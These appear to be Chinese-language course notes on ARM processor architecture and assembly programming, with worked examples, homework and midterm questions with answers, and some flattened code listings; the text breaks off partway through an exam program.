Z=1 表示运算的结果为零，否则结果不为零。 （3）C 分 4 种情况设置 C 的方法： ① 在加法指令中（包括比较指令CMN），当结果产生了进位，则C=1，表示无符号数运算发生上溢出，其它情况下C=0; ② 在减法指令中（包括比较指令CMP），当运算中发生了借位，则C=0，其它情况下C=1; ③ 对于在操作数中包含移位操作的运算指令（非加/减指令），C被设置成被移位寄存器最后移出去的位; ④ 对于其它非加/减法运算指令，C的值通常不受影响。 （4）V 下面分两种情况讨论V的设置方法： ① 对于加/减运算指令，当操作数和运算结果都是以二进制的补码表示的带符号的数时，且运算结果超出了有 符号运算的范围时溢出。V=1 表示符号位溢出； ② 对于非加/减法指令，通常不改变标志位 V 的值。 ARM 存储系统ARM支持大端模式（big-endian）和小端模式（little-endian）两种内存模式。 在大端模式下，一个字的高地址单元放的是数据的低位；而在小端模式下，数据的低位放在内存中低地址单元中。 中断和异常的基本概念（不考）*ARM 的异常ARM处理器可以响应的中断（异常）有：中断、快中断、复位中断、软中断异常、预取指令中止异常、数据中止异常和未定义指令异常 7 种。 作业题： 一、ARM 处理器有几种工作状态？分别是什么？ ARM 处理器有两种工作状态：ARM 状态和 Thumb 状态。 二、ARM 处理器有几种运行模式？分别是什么？ ARM 处理器有 7 种运行模式：用户模式、系统模式、一般中断模式、快速中断模式、管理模式、中止模式和未定义模式。 三、简单描述 ARM 体系结构与纯粹的 RISC 体系结构的不同点。 ARM 内核不是一个纯粹的 RISC 体系结构。ARM 指令集与纯粹的 RISC 的定义有以下几个不同。 （1）一些特定指令的周期数可变，并不是每条 ARM 指令都是单周期的。 （2）内嵌的桶形移位器产生了更为复杂的指令，扩展了指令的功能，因此改善了内核的性能。 （3）支持 16 位的 Thumb 指令集，提高了代码密度。 （4）支持条件执行：每条指令都可以设置一个执行条件，只有条件满足时才执行。 （5）增强指令：一些功能强大的数字信号处理指令被加入到 ARM 指令集中。 四、简单描述 ARM9 的 5 级流水线 取指：指令从存储器中取出，放入指令流水线； 译码：指令译码； 执行：把一个操作数移位，产生 ALU 的结果。如果指令是 Load 或 Store，在 ALU 中计算存储器的地址； 缓存/数据：如果需要，则访问数据存储器；否则，ALU 的结果只是简单地缓冲一个时钟周期，以便使所有指令具有同样的流水线流程； 回写：将指令产生的结果写回到寄存器堆，包括任何从寄存器读出的数据。 五、简单描述 ARM 处理器进入异常所采取的操作。 (1) 在适当的 LR 中保存断点的地址。 (2) 把当前程序状态寄存器（CPSR）中的内容保存到模式私有寄存器 SPSR 中； (3) 将寄存器 CPSR 中的 MODE 域设置为中断（异常）应进入的运行模式； (4) 对 CPSR 的 I 位和 F 位进行相应的设置，以防止再次响应同一个中断请求。 (5) 强制 PC 从相关的异常向量处取指，即到中断向量表中获取中断向量，转向用户所编写的中断（异常）服务程序。 六、ARM 的快中断（FIQ）采用了几种措施来保证更快的响应速度？这些措施是什么？ 为减少延时，ARM 在快中断中采取了 两个措施： （1）专门为快中断配置了较多的私有寄存器，从而可使中断服务程序有足够的寄存器来使用，而不必与被中断服务程序使用同一组寄存器，这样就免去了因寄存器冲突而必需的保护及恢复现场工作。 （2）ARM 把 FIQ 的中断向量放在了中断（异常）向量表末尾 0X0000001C 处，因此它后面没有其它中断向量，允许用户将中断服务程序直接放在这里。 七、多选题 为减少延时，提高中断处理速度，ARM 在快中断中采取了哪些措施（ B、D ） A. 配置了高速缓存。 B. 配置了较多的私有寄存器。 C. 更高的中断优先级。 D. 把 FIQ 的中断向量放在了中断（异常）向量表末尾处。 下列说法正确的是（ A、B、C、D ）。 A. 异常实质上也是一种中断，只不过它主要负责处理处理器内部事件 B. 中断控制器用于中断源和处理器之间，主要用于对处理器可以接收中断源的数目进行扩充及对中断进行必要的管理。 C. 处理器在现行指令执行结束后，才能响应中断。 D. 在处理器收到中断请求之后，它们都需要获得中断服务程序首地址——中断向量。 下列关于 ARM 的说法正确的是（ B、C、D ） A. ARM 公司生产的处理器 B. ARM 是一个公司的名称 C. ARM 是一类微处理器的通称 D. ARM 是一种技术的名称 八、判断题 ARM9TDMI 核其工作模式有两种：ARM 模式和 Thumb 模式。（ X ） 当异常发生，进入异常运行模式的时候，处理器会自动禁用中断和快中断，以确保异常处理程序安全运行。（ X ） 当处理器处于 Thumb 状态时发生了异常，在异常向量地址装入 PC 时，会自动切换到ARM 状态。（ √ ） S3C2440 芯片可以通过软件来指定存储器格式，缺省为小端格式。（ √ ） 在减法指令中，当运算中发生了借位，则 C 标志位=1。（ X ） ARM 处理器在用户模式下，可以通过修改 CPSR 进入系统模式。（ X ） 对于计算机系统来说，一个字的长度是 32 位的，半字的长度是 16 位的。（ X ） ARM920T 处理器中，对是通过协处理器 P15 来实现对 MMU 的控制的。（ √ ） ARM9 的 5 级流水线设计，相对于 ARM7 的 3 级流水线设计，减少了在每个时钟内必须完成的最大工作量，进而允许使用较高的时钟频率。（ √ ） ARM处理器采用的是RISC体系结构，因此所有的指令都在一个周期内执行完成。（ X ） 九、单选题 如果处理器采用大端存储器格式，假如一个字存放在地址为 A、A+1、A+2、A+3 四个连续的存储单元中，则该字的地址为（ A ）大端下该字的地址定义为最低地址 A．A B．A+1 C．A+2 D．A+3 ARM7EJ 名称中的 J 后缀，代表（ C ） A、支持增强型 DSP 指令 B、支持 Thumb 指令集 C、支持 Jazelle D、支持 Embedded ICE 在通用的 CPU 上提供 DSP 能力，是从 ARM 指令集构体系结构版本（ B ）以后开始的。 A、v4 B、v5 C、v6 D、v7 ARM 推出的 Cortex 系列包括三个系列，其中实时操作系统而设计的是（ C ） A、Cortex-A B、Cortex-B C、Cortex-R D、Cortex-M 在 ARM9 的 5 级流水线设计中，从寄存器中读取操作数，是在哪个阶段完成的？（ B ） A、取指 B、译码 C、执行 D、缓存/数据 E、回写 在 ARM9 的 5 级流水线设计中，计算访存指令访问存储器的地址的操作，是在哪个阶段完成的？（ C ） A、取指 B、译码 C、执行 D、缓存/数据 E、回写 ARM 处理器的 7 种运行模式中，处理器复位之后进入（ C ）。 A．用户模式 B．系统模式 C．管理模式 D．终止模式 下列 ARM 处理器的运行模式中，不属于异常模式的是（ B ）。 A．未定义模式 B．系统模式 C．管理模式 D．终止模式。 R13 通常用于存储（ D ）。 A．程序计数器 B．中断返回地址 C．子程序返回地址 D．堆栈指针 程序计数器的值保存在（ D ）中。 A．R12 B．R13 C．R14 D．R15 读程序计数器时，指令读出的 R15 的值是当前指令地址加上（ D ）字节。 A．1 B．2 C．4 D．8 ARM 指令集ARM 指令集简介ARM微处理器的ARM指令集 ，所有的指令长度都是32位 ，并且大多数指令都在一个单独指令周期内执行。 主要特点包括： 指令是条件执行的； ARM 微处理器的指令集是加载/存储型的； 在多寄存器操作指令中一次最多可以完成 16 个寄存器的数据传送。 ARM 指令格式一、指令的一般格式 1&lt;opcode&gt; {&lt;cond&gt;} {S} {&lt;Rd&gt;} {, &lt;Rn&gt;} {, &lt;OP2&gt;} 格式中 &lt; &gt; 的内容必不可少，{ } 中的内容可省略。 opcode 表示操作码，如 ADD 表示算术加法；cond 表示指令执行的条件域，如 EQ、NE 等。 { S } 决定指令的执行结果是否影响 CPSR 的值，使用该后缀则指令执行的结将果影响 CPSR 的值，否则不影响。 Rd 表示目标寄存器存储结果；Rn 为寄存器提供第一个操作数；OP2 表示第二个操作数，可以是立即数、寄存器和寄存器移位操作数。 在指令格式中，操作码（opcode）是必须指定的部分，不能省略，而其他部分（如 cond、S、Rd、Rn、OP2）都是可选的，可以根据需要选择是否包含在指令中。换句话说，除了操作码外，其他域可以根据具体指令的需求省略或使用。 例如：指令 ADDEQS R0, R1, #8; 执行结果 R0 = R1 + 8。LDR R3, [R6]：将 R6 寄存器内容所指向的存储单元内容读出，保存在 R3 中，执行条件 AL。BEQ NEXT：分支指令B，加上后缀EQ，变为BEQ，表示“满足条件相等则跳转” 。ADD R0，R1，#2 加法指令ADD，R0=R1+2，不带S，计算结果不影响CPSR寄存器。SUBNES R0，R1，#0X03条件执行减法运算（NE），R0=R1-0X03，影响CPSR寄存器。 二、指令的机器码 从形式上看，ARM指令在机器中的表示格式是用32位的二进制数表示。 ARM指令代码一般可以分为5个域： 第1个域是4位[31:28]的条件码域，4位条件码共有16种组合； 第2个域是指令代码域[27:20],除了指令编码外，还包含几个很重要的指令特征和可选后缀的编码 第3个域是第1个操作数寄存器Rn，是4位[19:16],为R0～R15共16个寄存器编码； 第4个域是目标或源寄存器Rd，是4位[15:12],为R0～R15共16个寄存器编码； 第5个域是第二个操作数[11:0]。 三、指令的可选后缀 1）S后缀 指令中使用S后缀时，指令执行后程序状态寄存器的条件标志位将被刷新，不使用S后缀时，指令执行后程序状态寄存器CPSR的条件标志将不会发生变化。 例:假设R0=0x1,R3=0x3,指令执行之前CPSR部分标志位为nZcv,分别执行如下指令CPSR的值有何变化？ SUB R1,R0,R3； R0的值减去R3的值，结果存入R1 SUBS R1,R0,R3； R0的值减去R3的值，结果存入R1； 影响标志位。 分析：执行第1条指令对于标志寄存器的值没有任何影响，因此CPSR的值不变。执行第2条指令后CPSR=Nzcv 2）！后缀 如果指令地址表达式中不含！后缀，则基址寄存器中的地址值不会发生变化。 指令中的地址表达式中含有!后缀时，指令执行后，基址寄存器中的地址值将发生变化，变化的结果如下： 基址寄存器中的值（指令执行后）＝指令执行前的值＋地址偏移量 例 分别执行下面两条指令有何区别？ LDR R3,[R0,#4] LDR R3,[R0,#4]！ 分析：在上述指令中，第1条指令没有后缀！，指令的结果是把R0加4作为地址指针，把这个指针所指向的地址单元所存储的数据读入R3，R0的值不变。第2条指令除了实现以上操作外，还把R0＋4的结果送到R0中。 使用!后缀需要注意如下事项： (1)！后缀必须紧跟在地址表达式后面，而地址表达式要有明确的地址偏移量； (2)! 后缀不能用于R15(PC)的后面； (3)当用在单个地址寄存器后面时，必须确信这个寄存器有隐性的偏移量，例如“STMIA R7!, {R0 – R3}”此时地址基址寄存器R7的隐性偏移量是16字节。如果R7的初始值为 0X40000000，则该语句结束后为0X40000010 3）B 后缀 B后缀的含义是：指令所涉及的数据是一个字节，不是一个字或半字。 指令的条件码ARM 指令的 条件码 和 助记符 如下表所示（PPT 19 页） 指令分类ARM 指令可以分为：分支指令、数据处理指令、存储访问指令、协处理器指令和杂项指令五类。 ARM 指令的寻址方式立即数寻址12ADD R0, R0, #1; R0 &lt;- R0+1MOV R0, #15; R0 &lt;- 15 循环右移，8位位图。需确认立即数是否可以表示为一个 8 位值（0x00 到 0xFF，十进制 0 到 255）。 ARM 架构的立即数编码规则（一种常见的形式）： 许多 ARM 指令中的立即数并不是直接使用一个固定的位数（比如 16 位或 32 位）来表示。相反，它们通常由一个 8 位的常数 (immed_8) 和一个 4 位的循环右移值 (rotate_imm) 组成。最终的 32 位立即数是通过将这个 8 位常数（零扩展到 32 位）循环右移 2 * rotate_imm 位 得到的。 这意味着，只有那些可以通过将一个 0 到 255 之间的 8 位数值循环右移偶数位（0, 2, 4, …, 30 位）得到的 32 位数值，才是“合法”的立即数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;uint32_t rot(uint32_t value, unsigned int shift) { shift &amp;= 31; if (shift == 0) { return value; } return (value &gt;&gt; shift) | (value &lt;&lt; (32 - shift));}int get_arm_immediate_params(uint32_t num, uint8_t *immed_8_ptr, uint8_t *rotate_imm_ptr) { for (int r = 0; r &lt; 16; r++) { uint32_t rotated = rot(num, r * 2); if ((rotated &amp; ~0xFFU) == 0) { *immed_8_ptr = (uint8_t)rotated; *rotate_imm_ptr = (uint8_t)r; return 1; } } return 0;}int main() { uint32_t K; uint8_t immed_8_val; uint8_t rotate_imm_val; printf(&quot;请输入一个十六进制数: &quot;); if (scanf(&quot;%x&quot;, &amp;K) != 1) { fprintf(stderr, &quot;输入错误，需要一个有效的十六进制数。\\n&quot;); return 2; } int result = get_arm_immediate_params(K, &amp;immed_8_val, &amp;rotate_imm_val); if (result == 1) { printf(&quot;输入值 0x%X 是 ARM 立即数。\\n&quot;, K); printf(&quot; 8 位立即数 (immed_8) : 0x%02X\\n&quot;, immed_8_val); printf(&quot; 4 位循环右移量 (rotate_imm): %u\\n&quot;, rotate_imm_val); printf(&quot; (实际右移位数 : %u)\\n&quot;, rotate_imm_val * 2); } else { printf(&quot;输入值 0x%X 不是 ARM 立即数。\\n&quot;, K); printf(&quot;0\\n&quot;); } return 0;} MOV R0，#0xF200 ;E3A00CF2. 0xF200 =0xF2 ROR(2*C） 只有能够通过此构造方法得到的才是合法的立即数。 寄存器寻址12MOV R1, R2; R1 &lt;- R2ADD R1, R1, R2; R1 &lt;- R1+R2 寄存器移位寻址12ADD R3, R2, R1, LSR #2; R3 &lt;- R2+(R1右移2位)ADD R3, R2, R1, LSR R0; R3 &lt;- R2+(R1右移R0位) 寄存器间接寻址1LDR R0, [R4]; R0 &lt;- [R4] 基址变址寻址1LDR R0, [R1, #4]; R0 &lt;- mem32[R1+4] 多寄存器寻址1LDMIA R0！，{R1-R4} ；R1←[R0]、R2←[R0＋4]、R3←[R0＋8]、R4←[R0＋12] 注意：对于所有LDM/STM指令而言，寄存器序号低的，在低地址单元，序号大的在高地址单元！与书写顺序无关！ 堆栈寻址向上生长：向高地址方向生长，称为递增堆栈。 STMXX是存入到主存，是入栈操作； LDMXX是从主存读出到寄存器，是出栈操作。 相对寻址ARM 指令集分支指令写汇编程序时，可以跳转到一个绝对地址，如: 1B 0x1234 注： B #0x1234是错误的 例：已知寄存器 R0 中存放了数据 a，寄存器 R1 中存放了数据 b，编写一个程序段，求取 a 和 b 的最大公约数并将其存入寄存器 R0。 先写一个 C 语言版本的： 1234567891011int gcd(int a, int b) { while (a != b) { if (a &gt; b) { a = a - b; } else { b = b - a; } } return a;} 转换成对应的汇编指令： 123456gcdCMP R0, R1SUBGT R0, R0, R1SUBLT R1, R1, R0BNE gcdMOV PC LR B和BL的区别在于：BL在跳转之前会把BL指令的下一条指令地址（断点地址）保存到连接寄存器 LR（R14），因此程序在必要的时候可以通过将 LR 的内容加载到 PC 中，使程序返回到跳转点。 BL 指令经常被用来调用一个子程序。 BX 功能：跳转到指令中所指定的目标地址，并实现状态切换。 BLX 指令的功能是：把程序跳转到指令中所指定的目标地址继续执行，并同时将处理器的工作状态从ARM状态切换到Thumb状态，并将下一条的地址保存到寄存器 LR 中。 1234567891011121314151617 ; 主程序 MOV R0, #48 ; 示例输入：R0 = 48 MOV R1, #18 ; 示例输入：R1 = 18 BL gcd ; 调用 gcd 子程序 ; 结果在 R0 中（这里是 6） B end ; 跳转到程序结束gcd: CMP R0, R1 ; 比较 R0 和 R1 SUBGT R0, R0, R1 ; 如果 R0 &gt; R1，则 R0 = R0 - R1 SUBLT R1, R1, R0 ; 如果 R1 &gt; R0，则 R1 = R1 - R0 BNE gcd ; 如果 R0 != R1，继续循环 BX LR ; 返回到调用者（使用 BX LR 替代 MOV PC, LR）end: ; 程序结束（可以添加停止指令，如死循环） B end 数据处理指令主要完成寄存器中数据的算术和逻辑运算操作。 操作数来源：所有的操作数要么来自寄存器，要么来自立即数，不会来自存储器。 操作结果：如果有结果，则结果一定是为32位宽、或64位宽（长乘法指令），并且放在一个或两个寄存器中，不会写入存储器。 有第二个操作数（除了乘法指令） Operand2 ：切记其三种形式：立即数、寄存器、寄存器移位。 乘法指令的操作数：全部是寄存器。 指令中可以选择s后缀，以影响状态标志。但是比较指令（CMP和CMN）和测试指令(TST和TEQ)不需要后缀S，它们总会直接影响CPSR中的状态标志。 ADC——带进位加法指令：ADC指令将operand2的数据与Rn的值相加，再加上CPSR中的C条件标志位，结果保存到Rd寄存器。 例：有 两个128位数，第一个数由高到低存放在寄存器R7—R4 中，第二个数由高到低存放在寄存器 R11—R8 中， 请编写程序把两个数相加，运算结果由高到低存放到寄存器R3~R0中。 1234ADDS R0，R4，R8 ；加低位字，不带进位ADCS R1，R5，R9 ；加第二个字，带进位ADCS R2，R6，R10 ；加第三个字，带进位ADCS R3，R7，R11 ；加第四个字，带进位 SBC——带进位减法指令（81） CMP 存储器访问指令基本的加载/存储指令仅有5条，分为3种： — LDR和STR，单寄存器加载/存储指令 — LDM和STM，多寄存器加载/存储指令 — SWP，寄存器和存储器数据交换指令 PC（即R15） 已知（R0）=0X00000000和（R1）=0X00009000，并已知在存储器中首地址为 0X00009000 的区域中存放了数 据0X01010101，在首地址为 0X00009004 的区域存放了数据 0X02020202。 试写出执行了指令 LDR R0，[R1，#4] 后R0 和 R1 中的数据。 （R0）= 0X02020202 （R1）= 0X00009000 试写出执行了指令 LDR R0，[R1，#4]！后的 R0 和 R1 中的数据。 （R0）= 0X02020202 （R1）=0X00009004 协处理器指令（了解）杂项指令例题： 一、算数逻辑运算指令的应用 例2：64位数据运算 假设R0和R1存放一个64位数据，R0中存放数据的低32位；R2和R3中存放另一个64位数据，R2中存放数据的低32位。对这两个64位数进行加、减和比较运算。（R1，R0）、（R3，R2） ①两个64位数据的加法运算，结果保存到R0和R1中。 12ADDS R0, R0, R2 ;低32位相加，设置CPSR的C标志位。ADC R1, R1, R3 ;高32位的带位相加 ②两个64位数据的减法运算，结果保存到R0和R1中。 12SUBS R0, R0, R2 ;低32位相减，设置CPSR的C标志位。SBC R1, R1, R3 ;高32位的带位相减 ③两个64位数据的比较操作，并设置CPSR中的条件标志位。 12CMP R1, R3 ;比较高32位CMPEQ R0, R2 ;如果高32位相等，比较低32位 例3：转换内存中数据存储方式 将寄存器R0中的数据存储方式转换成另一种存储方式。指令执行前R0中数据存储方式为：R0=A,B,C,D；指令执行后R0中数据存储方式为：R0=D,C,B,A。 二、跳转指令的应用 例3：循环语句 将内存中从0x400800开始的100个字数据相加，其结果存于R3、R2中（R3中为高32位）。 12345678910 LDR R0, =0x400800 MOV R1, #100 ;循环计数器 MOV R2, #0 ;用于低32位累加 MOV R3, #0 ;用于高32位累加loop LDR R4, [R0], #4 ADDS R2, R2, R4 ADC R3, R3, #0 SUBS R1, R1, #1 BNE loop;循环计数器不为0,跳到loop继续执行 例4：链表操作中的条件码应用 在链表中搜索与某一数据相等的元素。 链表的每个元素包括两个字，第1个字中包含一个字节数据；第2个字中包含指向下一个链表元素的指针，当这个指针为0时表示链表结束。 代码执行前R0指向链表的头元素，R1中存放将要搜索的数据；代码执行后R0指向第1个匹配的元素，或者当没有匹配元素时，R0为0。 1234567SEARCH CMP R0,#0 ;R0指针是否为空 LDRNEB R2,[R0] ;读取当前元素中的字节数据 CMPNE R1,R2 ;判断数据是否为搜索的数据 LDRNE R0,[R0,#4] ;如果不是,指针R0指向下一个元素 BNE SEARCH ;跳转到search执行 MOV PC,LR ;搜索完成，程序返回 作业题： 一、ARM 指令分为几类？分别是什么？ ARM 指令有五类：分支指令、数据处理指令、存储访问指令、协处理器指令和杂项指令五类。 二、ARM 指令有几种寻址方式？分别是什么？ ARM 指令有八种寻址方式：立即数寻址、寄存器寻址、寄存器移位寻址、寄存器间接寻址、基址变址寻址、多寄存器寻址、堆栈寻址、相对寻址。 三、单选 下列指令合法的是（ B ）8位位图 A．MOV R0,#0x132 B．MOV R0,#0x264 C．MOV R0,#0x266 D．MOV R0,#0x4C8 汇编指令 MOV R0,#0x4800, 经编译后，所得到的机器码的低 12 位是（ A ） A．0xB12 B．0xB24 C．0xA09 D．0xC48 假设 R1 寄存器中的值为 ADR，则在执行了指令：STMIA R1!, {R3-R5,R8} 指令后，R1 的 内容为（ A ）。 A、R1=ADR+16 B、R1=ADR+12 C、R1=ADR-16 D、R1=ADR-12 假设 R1 寄存器中的值为 ADR，则在执行了指令：STMDB R1!, {R3-R5,R8} 指令后，R5 寄存器中的内容将存放在地址为（ B ）的存储单元中： A、ADR-4 B、ADR-8 C、ADR-12 D、ADR-16 假设 SP 寄存器中的值为 ADR，则在执行了指令：STMED SP!, {R3-R5,LR} 指令后，SP 的 内容为（ C ）。 A、ADR+16 B、ADR+12 C、ADR-16 D、ADR-12 假设 SP 寄存器中的值为 ADR，则在执行了指令：STMED SP!, {R3-R5,LR} 指令后，LR 寄 存器中的内容将存放在地址为（ A ）的存储单元中。 A、ADR B、ADR-4 C、ADR-12 D、ADR-16 假设 SP 寄存器中的值为 ADR，则在执行了指令：LDMEA SP!, {R3-R5,PC} 指令后，地 址为（ B ）的存储单元的值，将出栈到 PC 寄存器中。 A、ADR B、ADR-4 C、ADR-12 D、ADR-16 ARM 伪指令及编程基础 什么是伪指令？ 人们设计了一些专门用于指导汇编器进行汇编工作的指令，由于这些指令不形成机器码指令，它们只是在汇编器进行汇编工作的过程中起作用，所以被叫做伪指令。 伪指令有两个特征：①伪指令是一条指令；②伪指令没有指令代码。 伪指令的作用：①程序定位的作用；②为非指令代码进行定义；③对程序完整性做标注；④有条件的引导程序段。 通用伪指令在 ARM 汇编程序语言中，有如下几种伪指令： 符号定义 数据定义 汇编控制 其它 为变量定义或赋值的伪指令一、声明全局变量伪指令 GBLA、GBLL和GBLS GBLA 定义一个 全局数字变量，其默认初值为 0 ； GBLL 定义一个 全局逻GBLS 定义一个 全局字符串变量，其默认初值为 空 ；辑变量 ，其默认初值为 FALSE（假）； 二、声明局部变量伪指令LCLA、LCLL和LCLS LCLA、LCLL和LCLS伪指令用于定义一个ARM程序中的局部变量，并将其初始化。 LCLA 定义一个局部数字变量，其默认初值为 0；LCLL 定义一个局部逻辑变量，其默认初值为 FALSE（假）；LCLS 定义一个局部字符串变量，其默认初值为 空。 局部变量 的变量名在变量作用范围内必须具有唯一性。在默认情况下，局部变量只在定义该变量的程序段内有效。 三、变量赋值伪指令 SETA、SETL和SETS 伪指令SETA、SETL和SETS 用于给一个已经定义的全局变量或局部变量进行赋值。 注：要顶格写 SETA伪指令用于给一个数字变量赋值；SETL伪指令用于给一个逻辑变量赋值；SETS伪指令用于给一个字符串变量赋值； 1Test1 SETA 0xAA 四、定义寄存器列表伪指令 指令 LDM/STM 需要使用一个比较长的寄存器列表，使用伪指令 RLIST 可对一个列表定义一个统一的名称。 123456LoReg RLIST {R0-R7} ；定义寄存器列表{R0-R7} ；的名称为LoRegSTMFD SP!, LoReg ；堆栈操作使用寄存器列表RegList RLIST {R0-R5,R8,R10} ；将寄存器列表名称定义 ；为RegList，可在ARM指令LDM/STM中 ；通过该名称访问寄存器列表 数据定义伪指令1、 LTORG 用于声明一个数据缓冲池（文字池）的开始。 其目的是，防止在程序中使用LDR之类的指令访问时，可能产生的越界。 通常把数据缓冲池放在代码段的最后面，或放在无条件转移指令或子程序返回指令之后，这样处理器就不会错误地将数据缓冲池中的数据当作指令来执行。 2、MAP 和 FIELD MAP 用于定义一个结构化的内存表的首地址。FIELD 伪指令用于定义一个结构化内存表中的数据域。MAP 通常和 FIELD 伪指令相配合来定义一个结构化的内存表。 3、SPACE SPACE伪指令用于分配一片连续的存储区域并初始化为 0 4、DCB分配内存单元并初始化 5、DCD和DCDU分配存储单元并初始化 控制程序流向伪指令其他伪指令1、定义对齐方式伪指令 ALIGN 2、段定义伪指令AREA AREA用于定义一个代码段或数据段。常用的属性如下： 一个汇编语言程序 至少 要有一个代码段。 3、CODE16 和 CODE32 4、定义程序入口点伪指令 ENTRY 一个程序（可包含多个源文件）中至少要有一个ENTRY（可以有多个ENTRY，当有多个ENTRY入口时，程序的真正入口点由链接器指定），但一个源文件中最多只能有一个ENTRY（可以没有ENTRY）。 5、汇编结束伪指令 END 6、外部可引用符号声明伪指令 EXPORT（或GLOBAL） 7、IMPORT 8、EXTERN 9、等效伪指令 EQU（#define） 10、GET（或INCLUDE） 与ARM指令相关的宏指令宏1、MACRO 和 MEND 12345678910MACRO ；宏定义指令$MDATA MAXNUM $NUM1,$NUM2 ；主标号，宏名，参数语句段$MDATD.WAY1 ； 宏内标号，必须写为“主标号.宏内标号”语句段$MDATA.WAY2 ； 宏内标号语句段MEND ； 宏结束指令主程序中调用该宏：Lab1 MAXNUM 0x01, 0x02 2、MEXIT MEXIT 用于从宏定义中跳转出去。 宏指令在ARM中，还有一种汇编器内置的无参数和标号的宏——宏指令。 在汇编时，这些宏指令被替换成一条或两条真正的ARM或 Thumb 指令。ARM宏指令有四条，分别是： • ADR：小范围的地址读取宏指令； • ADRL：中等范围的地址读取宏指令； • LDR：大范围的地址读取宏指令； • NOP：空操作宏指令。 ARM汇编程序设计模板要点 123456AREA example,CODE,READONLY;定义代码段，一个ARM汇编程序至少有一个代码段ENTRY ;定义程序入口点…………END ;汇编语言程序结束 例题： 该程序执行后： 1234567891011121314 AREA blockcopy,CODE,READONLY ENTRY LDR R1,=ftt ;将符号ftt的地址加载到寄存器R1中。 LDR R2,=ftt2 LDR R3,[R1] LDR R4,[R2] LDR R5,[R1, #4] LDR R6,[R2, #4] Src DCD 1,2,3,4,5,6,7,8,1,2,3,4,5,6,7,8,1,2,3,4StrMem DCB “ABCS”,0 MAP Srcftt FIELD 8ftt2 FIELD 8 END R3= 1 ，R4= 3 ，R5= 2 ，R6= 4 本门课中（包括考试和作业）如果没有特殊说明，存储方式均默认为小端模式 1234567891011 AREA blockcopy,CODE,READONLY ENTRY ARM LDR R0,=ss1 LDR R1,=ss2 LDR R4,[R0] ALIGN 4ss1 DCB 1 ALIGN 4,3 ss2 DCB 3 END 该段程序执行完成后，假如R0的值为0x10001000，则R1=0x10001003 ，R4=0x03000001 作业题： 六、在列表中查找指定的数据 要求如下： (1) 定义一个存储单元首地址名为 Start 的数据列表，该数据列表包含 5 个字存储单元。第一个单元是列表中数据的数量，其值为 4，即列表中包含 4 个数据。后面四个单元存储的是列表中的 4 个数据：0x0138A, 0x0A21DC, 0x1F5376, 0x9018613。 (2) 定义一个名为 NewItem 的字存储单元，该单元中包含要查找的数据，该例要求是0x1F5376 (3) 要求编写一个程序，在 Start 数据列表中查找是否包含 NewItem 单元中的数据。如果包含则把该数据在列表中的位置序号（1、2、3、4）存储到 Index 字存储单元中。否则在Index 字存储单元中存储 0xFFFFFFFF。 (4) 要求 Start 的数据列表和 NewItem 的字存储单元定义在代码段中（只读的 ROM 区），而 Index 字存储单元要定义在一个名为 mydata 的数据段中（可读写的 RAM 区）。 1234567891011121314151617181920212223242526272829303132333435363738 AREA myprog, CODE, REDFONLY ENTRYMain LDR R0, =Start ; R0 = Start 的地址 LDR R1, NewItem ; R1 = NewItem 的值 LDR R3, Start ; R3 = Start 的第一个值 CMP R3, #0 ; 检查 R3 是否为 0 BEQ Missing ; 如果 R3 = 0，跳转到 Missing LDR R4, [R0, #4]! ; R4 = Start[1]，R0 增加 4 MOV R2, #1 ; R2 = 1（索引）Loop CMP R1, R4 ; 比较 R1 和 R4 BEQ Done ; 如果相等，跳转到 Done SUBS R3, R3, #1 ; R3 -= 1（计数器） LDR R4, [R0, #4]! ; R4 = 下一个元素，R0 增加 4 ADD R2, #1 ; R2 += 1（索引） BNE Loop ; 如果 R3 != 0，继续循环 Missing MOV R2, #0xFFFFFFFF Done LDR R5, =Index ; R5 = Index 的地址 STR R2, [R5] ; 存储 R2 到 Index SWI 0x11 ; 退出程序Start DCD 0x4, 0x0138A, 0x0A21DC, 0x1F5376, 0x9018613]NewItem DCD 0x1F5376 AREA mydata, NOINIT MAP 0x40000000Index FIELD 4 END 九、试把如下 C 函数改写成 ARM指令函数。 123int subxx(int x, int y) { return x - y;} 改写为： 123456 AREA TT, CODE, READONLY EXPORT subxxsubxx SUBS R0, R0, R1 MOV PC, LR END 十、把下面的 ARM 指令函数改写成 C 语言函数。 123456789 AREA tt, CODE, READONLY EXPORT strcopystrcopy LDRB R2, [R1], #1 STRB R2, [R0], #1 ;将 R2 中的字节写入 R0 指向的内存地址。 CMP R2, #0 BNE strcopy MOV PC, LR END 等效于 12345678void strcopy(char *d, char *s) { while (*s != '\\0') { *d = *s; d = d + 1; s = s + 1; } *d = *s;} 期中考试判断对错题（30分） 精简指令集RISC相对复杂指今集CISC,具有更少的指令，指令实现的功能更简单，因此实现同样一个复杂功能，采用RISC指令编写的程序比采用C1SC指令偏写的程序具有更少的代码量。(8分) 错误 实时操作系统中的任务的硅起态是指任务进入任务等待队列，等待通过调度转为运行状态。（5分）错误 ARM体系结构与纯粹的RISC体系结构不完全相同。(12分) 正确 在 ARM 状态下， 任一时刻都可以访问到 16 个通用寄存器和 2 个状态寄存器。(5 分) 错误 阅读程序并填空题（39分）（注：假设 RAM 区存储单元上电后缺省值都为 0） 1、阅读程序，并根据要求填空。 12345678910111213141516171819202122232425262728293031323334353637AREA myprog, CODE, READONLYLDR R0, =MyDataLDR R1, =Des_RAMSTRB R4, [R3,#-1]LDR R4, [R1]BLDR R2, =FLD2LDR R3, =FLD_CSUB R6, R2, R0SUB R7, R3, R1LDR R4, [R2,#4]STR R4, [R3,#-4]!SUB R8, R2, R0SUB R9, R3, R1LDR R4, [R2],#-4STR R4, [R3,#-4]!MOV R12, #4LDR R4, [R0,R12,LSL #02]STR R4, [R3,#-4]MOV R12, #5LDRB R4, [R0,R12,LSL #02]MyData DCD 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xA, 0xB,DCD 0xC,0xD, 0xE, 0xFMAP MyDataFLD1 FIELD 4FLD2 FIELD 8FLD3 FIELD 8AREA mydata, DATA, READWRITEDes_RAM SPACE 40MAP Des_RAMFLD_A FIELD 4FLD_B FIELD 8FLD_C FIELD 8END 上述程序执行后，下列各寄存器的值分别是多少？R6 = 4，R7 = 12，R8 = 4，R9 = 8。 从 Des_RAM 地址开始的连续 3 个字单元的内容是：0x6000005，2，3。 2、阅读程序，并根据要求填空。 123456789101112131415161718192021222324252627 GBLA Len GBLS StrA GBLS StrB GBLS StrC GBLL VLStrA SETS &quot;My String!&quot;VL SETL {True}StrB SETS :STR: 0x12345678StrC SETS StrA :CC: StrB :RIGHT: 3Len SETA :LEN: StrCDAdr EQU DataA AREA mycode, CODE, READONLY ENTRY LDR 